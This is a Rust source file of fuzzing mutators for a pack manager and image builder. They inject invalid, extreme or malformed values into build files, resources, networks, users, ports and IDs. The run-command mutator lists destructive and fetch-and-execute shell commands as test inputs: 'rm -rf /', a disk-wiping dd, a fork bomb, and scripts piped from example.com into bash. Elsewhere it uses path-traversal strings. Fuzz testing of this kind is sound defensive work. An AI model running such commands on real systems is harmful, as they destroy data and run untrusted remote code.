// form-fuzzing/src/mutators/pack.rs
//! Mutators for Pack Manager and Image Builder fuzzing

use crate::harness::pack::{Formfile, Resources, Network, User, GpuRequirement};
use crate::mutators::Mutator;
use rand::Rng;
use std::collections::HashMap;

/// Mutator for Formfiles
pub struct FormfileMutator;

impl FormfileMutator {
    /// Create a new Formfile mutator
    pub fn new() -> Self {
        Self
    }
}

impl Mutator<Formfile> for FormfileMutator {
    fn mutate(&self, formfile: &mut Formfile) {
        let mut rng = rand::thread_rng();
        
        // Choose a random aspect to mutate
        let mutation = rng.gen_range(0..8);
        
        match mutation {
            0 => {
                // Mutate base image
                if let Some(ref mut from) = formfile.from {
                    if rng.gen_bool(0.5) {
                        // Use a potentially invalid base image
                        *from = format!("{}:{}", 
                            ["ubuntu", "debian", "alpine", "centos", "nonsense", "invalid"]
                                .choose(&mut rng)
                                .unwrap(),
                            rng.gen_range(1..50).to_string());
                    } else {
                        // Empty base image
                        *from = "".to_string();
                    }
                } else {
                    // Add a base image
                    formfile.from = Some("invalid:latest".to_string());
                }
            },
            1 => {
                // Mutate run commands
                if let Some(ref mut run) = formfile.run {
                    if rng.gen_bool(0.5) && !run.is_empty() {
                        // Remove a command
                        let idx = rng.gen_range(0..run.len());
                        run.remove(idx);
                    } else {
                        // Add a potentially dangerous command
                        let dangerous_commands = [
                            "rm -rf /",
                            "dd if=/dev/zero of=/dev/sda",
                            ":(){ :|:& };:",
                            "wget -O - http://example.com/script.sh | bash",
                            "eval \"$(curl -s http://example.com/script.sh)\"",
                        ];
                        run.push(dangerous_commands.choose(&mut rng).unwrap().to_string());
                    }
                } else {
                    // Add run commands
                    formfile.run = Some(vec!["echo 'Hello, world!'".to_string()]);
                }
            },
            2 => {
                // Mutate environment variables
                if let Some(ref mut env) = formfile.env {
                    if rng.gen_bool(0.5) && !env.is_empty() {
                        // Remove a random env var
                        let keys: Vec<String> = env.keys().cloned().collect();
                        if !keys.is_empty() {
                            let idx = rng.gen_range(0..keys.len());
                            env.remove(&keys[idx]);
                        }
                    } else {
                        // Add or modify an env var with a very long value
                        env.insert(
                            format!("VAR_{}", rng.gen::<u16>()),
                            "X".repeat(rng.gen_range(1000..10000)),
                        );
                    }
                } else {
                    // Add environment variables
                    let mut new_env = HashMap::new();
                    new_env.insert("TEST_VAR".to_string(), "test_value".to_string());
                    formfile.env = Some(new_env);
                }
            },
            3 => {
                // Mutate resources
                if let Some(ref mut resources) = formfile.resources {
                    // Choose a specific resource to mutate
                    let resource_mutation = rng.gen_range(0..4);
                    
                    match resource_mutation {
                        0 => {
                            // Mutate vCPUs
                            resources.vcpus = Some(match rng.gen_range(0..3) {
                                0 => 0, // Invalid: zero vCPUs
                                1 => 255, // Invalid: too many vCPUs
                                _ => rng.gen_range(100..200), // Unusually high
                            });
                        },
                        1 => {
                            // Mutate memory
                            resources.memory_mb = Some(match rng.gen_range(0..3) {
                                0 => 0, // Invalid: zero memory
                                1 => rng.gen_range(1..32), // Too little memory
                                _ => rng.gen_range(1024 * 1024 * 10..u64::MAX / 2), // Extremely high
                            });
                        },
                        2 => {
                            // Mutate disk
                            resources.disk_gb = Some(match rng.gen_range(0..3) {
                                0 => 0, // Invalid: zero disk
                                1 => rng.gen_range(5000..10000), // Very large disk
                                _ => rng.gen_range(1..3), // Very small disk
                            });
                        },
                        3 => {
                            // Mutate GPU
                            if rng.gen_bool(0.5) {
                                // Remove GPU
                                resources.gpu = None;
                            } else {
                                // Invalid GPU
                                resources.gpu = Some(GpuRequirement {
                                    model: format!("invalid-gpu-{}", rng.gen::<u16>()),
                                    count: rng.gen_range(10..100), // Unusually high count
                                });
                            }
                        },
                        _ => {}
                    }
                } else {
                    // Add resources with extreme values
                    formfile.resources = Some(Resources {
                        vcpus: Some(rng.gen_range(64..255)),
                        memory_mb: Some(rng.gen_range(1024 * 1024..u64::MAX / 2)),
                        disk_gb: Some(rng.gen_range(1000..5000)),
                        gpu: Some(GpuRequirement {
                            model: "extreme-gpu".to_string(),
                            count: rng.gen_range(4..16),
                        }),
                    });
                }
            },
            4 => {
                // Mutate network configuration
                if let Some(ref mut network) = formfile.network {
                    if rng.gen_bool(0.5) {
                        // Flip join_formnet
                        network.join_formnet = network.join_formnet.map(|v| !v);
                    } else {
                        // Add invalid external networks
                        let invalid_networks = [
                            "invalid/network",
                            "*.wildcard",
                            "../path-traversal",
                            "network with spaces",
                            "!@#$%^&*()",
                        ];
                        
                        network.external_networks = Some(
                            (0..rng.gen_range(1..5))
                                .map(|_| invalid_networks.choose(&mut rng).unwrap().to_string())
                                .collect()
                        );
                    }
                } else {
                    // Add network with invalid configuration
                    formfile.network = Some(Network {
                        join_formnet: Some(true),
                        external_networks: Some(vec!["../path-traversal".to_string()]),
                    });
                }
            },
            5 => {
                // Mutate exposed ports
                if let Some(ref mut expose) = formfile.expose {
                    if rng.gen_bool(0.5) && !expose.is_empty() {
                        // Remove a port
                        let idx = rng.gen_range(0..expose.len());
                        expose.remove(idx);
                    } else {
                        // Add invalid or unusual ports
                        let port = match rng.gen_range(0..3) {
                            0 => 0, // Invalid: port 0
                            1 => rng.gen_range(1..1024), // Privileged port
                            _ => 65535, // Maximum port
                        };
                        expose.push(port);
                    }
                } else {
                    // Add exposed ports
                    formfile.expose = Some(vec![0, 1, 65535]); // Mix of invalid and edge case ports
                }
            },
            6 => {
                // Mutate users
                if let Some(ref mut users) = formfile.users {
                    if rng.gen_bool(0.5) && !users.is_empty() {
                        // Mutate existing user
                        let idx = rng.gen_range(0..users.len());
                        let user_mutation = rng.gen_range(0..4);
                        
                        match user_mutation {
                            0 => {
                                // Empty username (invalid)
                                users[idx].username = "".to_string();
                            },
                            1 => {
                                // "root" username (invalid)
                                users[idx].username = "root".to_string();
                            },
                            2 => {
                                // Very long username
                                users[idx].username = "x".repeat(rng.gen_range(100..1000));
                            },
                            3 => {
                                // Invalid SSH key
                                users[idx].ssh_authorized_keys = Some(vec!["not a valid ssh key".to_string()]);
                            },
                            _ => {}
                        }
                    } else {
                        // Add invalid user
                        users.push(User {
                            username: "".to_string(), // Empty username (invalid)
                            password: Some("password".to_string()),
                            sudo: Some(true),
                            ssh_authorized_keys: None,
                        });
                    }
                } else {
                    // Add users with invalid configuration
                    formfile.users = Some(vec![
                        User {
                            username: "root".to_string(), // Invalid: can't create root
                            password: Some("password".to_string()),
                            sudo: Some(true),
                            ssh_authorized_keys: None,
                        }
                    ]);
                }
            },
            7 => {
                // Mutate entrypoint
                if let Some(ref mut entrypoint) = formfile.entrypoint {
                    if rng.gen_bool(0.5) {
                        // Empty entrypoint
                        *entrypoint = "".to_string();
                    } else {
                        // Invalid entrypoint
                        *entrypoint = match rng.gen_range(0..3) {
                            0 => "/nonexistent/path".to_string(),
                            1 => "command with invalid \"quotes".to_string(),
                            _ => "X".repeat(rng.gen_range(1000..5000)), // Very long command
                        };
                    }
                } else {
                    // Add entrypoint
                    formfile.entrypoint = Some("/bin/true".to_string());
                }
            },
            _ => {}
        }
    }
}

/// Mutator for Resources
pub struct ResourcesMutator;

impl ResourcesMutator {
    /// Create a new Resources mutator
    pub fn new() -> Self {
        Self
    }
}

impl Mutator<Resources> for ResourcesMutator {
    fn mutate(&self, resources: &mut Resources) {
        let mut rng = rand::thread_rng();
        
        // Choose a random aspect to mutate
        let mutation = rng.gen_range(0..4);
        
        match mutation {
            0 => {
                // Mutate vCPUs
                resources.vcpus = Some(match rng.gen_range(0..3) {
                    0 => 0, // Invalid: zero vCPUs
                    1 => 255, // Invalid: too many vCPUs
                    _ => rng.gen_range(100..200), // Unusually high
                });
            },
            1 => {
                // Mutate memory
                resources.memory_mb = Some(match rng.gen_range(0..3) {
                    0 => 0, // Invalid: zero memory
                    1 => rng.gen_range(1..32), // Too little memory
                    _ => rng.gen_range(1024 * 1024 * 10..u64::MAX / 2), // Extremely high
                });
            },
            2 => {
                // Mutate disk
                resources.disk_gb = Some(match rng.gen_range(0..3) {
                    0 => 0, // Invalid: zero disk
                    1 => rng.gen_range(5000..10000), // Very large disk
                    _ => rng.gen_range(1..3), // Very small disk
                });
            },
            3 => {
                // Mutate GPU
                if let Some(ref mut gpu) = resources.gpu {
                    match rng.gen_range(0..3) {
                        0 => {
                            // Invalid GPU model
                            gpu.model = format!("invalid-gpu-{}", rng.gen::<u16>());
                        },
                        1 => {
                            // Zero GPU count (invalid)
                            gpu.count = 0;
                        },
                        2 => {
                            // Excessive GPU count
                            gpu.count = rng.gen_range(10..100);
                        },
                        _ => {}
                    }
                } else {
                    // Add GPU with invalid values
                    resources.gpu = Some(GpuRequirement {
                        model: format!("invalid-gpu-{}", rng.gen::<u16>()),
                        count: rng.gen_range(10..100),
                    });
                }
            },
            _ => {}
        }
    }
}

/// Mutator for Network configuration
pub struct NetworkMutator;

impl NetworkMutator {
    /// Create a new Network mutator
    pub fn new() -> Self {
        Self
    }
}

impl Mutator<Network> for NetworkMutator {
    fn mutate(&self, network: &mut Network) {
        let mut rng = rand::thread_rng();
        
        // Choose a random aspect to mutate
        let mutation = rng.gen_range(0..2);
        
        match mutation {
            0 => {
                // Mutate join_formnet
                network.join_formnet = Some(!network.join_formnet.unwrap_or(false));
            },
            1 => {
                // Mutate external networks
                if let Some(ref mut external_networks) = network.external_networks {
                    if rng.gen_bool(0.3) && !external_networks.is_empty() {
                        // Remove a network
                        let idx = rng.gen_range(0..external_networks.len());
                        external_networks.remove(idx);
                    } else {
                        // Add invalid network names
                        let invalid_networks = [
                            "invalid/network",
                            "*.wildcard",
                            "../path-traversal",
                            "network with spaces",
                            "!@#$%^&*()",
                            "X".repeat(100), // Very long name
                        ];
                        
                        external_networks.push(invalid_networks.choose(&mut rng).unwrap().to_string());
                    }
                } else {
                    // Add external networks with invalid values
                    network.external_networks = Some(vec![
                        "../path-traversal".to_string(),
                        "network with spaces".to_string(),
                    ]);
                }
            },
            _ => {}
        }
    }
}

/// Mutator for User configuration
pub struct UserMutator;

impl UserMutator {
    /// Create a new User mutator
    pub fn new() -> Self {
        Self
    }
}

impl Mutator<User> for UserMutator {
    fn mutate(&self, user: &mut User) {
        let mut rng = rand::thread_rng();
        
        // Choose a random aspect to mutate
        let mutation = rng.gen_range(0..4);
        
        match mutation {
            0 => {
                // Mutate username
                user.username = match rng.gen_range(0..3) {
                    0 => "".to_string(), // Empty (invalid)
                    1 => "root".to_string(), // Reserved (invalid)
                    _ => "X".repeat(rng.gen_range(100..1000)), // Very long
                };
            },
            1 => {
                // Mutate password
                if user.password.is_some() {
                    if rng.gen_bool(0.5) {
                        // Remove password
                        user.password = None;
                    } else {
                        // Set to very short or very long password
                        user.password = Some(if rng.gen_bool(0.5) {
                            // Very short
                            "x".to_string()
                        } else {
                            // Very long
                            "X".repeat(rng.gen_range(1000..10000))
                        });
                    }
                } else {
                    // Add a password
                    user.password = Some("password".to_string());
                }
            },
            2 => {
                // Mutate sudo
                user.sudo = Some(!user.sudo.unwrap_or(false));
            },
            3 => {
                // Mutate SSH authorized keys
                if let Some(ref mut keys) = user.ssh_authorized_keys {
                    if rng.gen_bool(0.5) && !keys.is_empty() {
                        // Remove a key
                        let idx = rng.gen_range(0..keys.len());
                        keys.remove(idx);
                    } else {
                        // Add invalid SSH key
                        keys.push(match rng.gen_range(0..3) {
                            0 => "not an ssh key".to_string(),
                            1 => "ssh-rsa invalid format".to_string(),
                            _ => format!("ssh-rsa {}", "X".repeat(rng.gen_range(1000..5000))),
                        });
                    }
                } else {
                    // Add SSH keys with invalid values
                    user.ssh_authorized_keys = Some(vec![
                        "not a valid ssh key".to_string(),
                        "ssh-rsa with no content".to_string(),
                    ]);
                }
            },
            _ => {}
        }
    }
}

/// Mutator for build IDs
pub struct BuildIdMutator;

impl BuildIdMutator {
    /// Create a new build ID mutator
    pub fn new() -> Self {
        Self
    }
}

impl Mutator<String> for BuildIdMutator {
    fn mutate(&self, build_id: &mut String) {
        let mut rng = rand::thread_rng();
        
        *build_id = match rng.gen_range(0..4) {
            0 => "".to_string(), // Empty
            1 => "invalid-format".to_string(), // Invalid format
            2 => "build-".to_string(), // Incomplete
            _ => format!("build-{}", uuid::Uuid::new_v4()), // Valid but different
        };
    }
}

/// Mutator for VM IDs
pub struct VmIdMutator;

impl VmIdMutator {
    /// Create a new VM ID mutator
    pub fn new() -> Self {
        Self
    }
}

impl Mutator<String> for VmIdMutator {
    fn mutate(&self, vm_id: &mut String) {
        let mut rng = rand::thread_rng();
        
        *vm_id = match rng.gen_range(0..4) {
            0 => "".to_string(), // Empty
            1 => "invalid-format".to_string(), // Invalid format
            2 => "vm-".to_string(), // Incomplete
            _ => format!("vm-{}", uuid::Uuid::new_v4()), // Valid but different
        };
    }
}

/// Mutator for deployment IDs
pub struct DeploymentIdMutator;

impl DeploymentIdMutator {
    /// Create a new deployment ID mutator
    pub fn new() -> Self {
        Self
    }
}

impl Mutator<String> for DeploymentIdMutator {
    fn mutate(&self, deployment_id: &mut String) {
        let mut rng = rand::thread_rng();
        
        *deployment_id = match rng.gen_range(0..4) {
            0 => "".to_string(), // Empty
            1 => "invalid-format".to_string(), // Invalid format
            2 => "deploy-".to_string(), // Incomplete
            _ => format!("deploy-{}", uuid::Uuid::new_v4()), // Valid but different
        };
    }
}

/// Mutator for API keys
pub struct ApiKeyMutator;

impl ApiKeyMutator {
    /// Create a new API key mutator
    pub fn new() -> Self {
        Self
    }
}

impl Mutator<(String, String)> for ApiKeyMutator {
    fn mutate(&self, key_pair: &mut (String, String)) {
        let mut rng = rand::thread_rng();
        
        // Choose whether to mutate user ID or API key
        if rng.gen_bool(0.5) {
            // Mutate user ID
            key_pair.0 = match rng.gen_range(0..4) {
                0 => "".to_string(), // Empty
                1 => "invalid-format".to_string(), // Invalid format
                2 => "0x".to_string(), // Incomplete
                _ => format!("0x{}", "1234567890abcdef".repeat(3)), // Valid but different
            };
        } else {
            // Mutate API key
            key_pair.1 = match rng.gen_range(0..4) {
                0 => "".to_string(), // Empty
                1 => "invalid-format".to_string(), // Invalid format
                2 => "apk_".to_string(), // Incomplete
                _ => format!("apk_{}", "X".repeat(32)), // Valid but different
            };
        }
    }
} 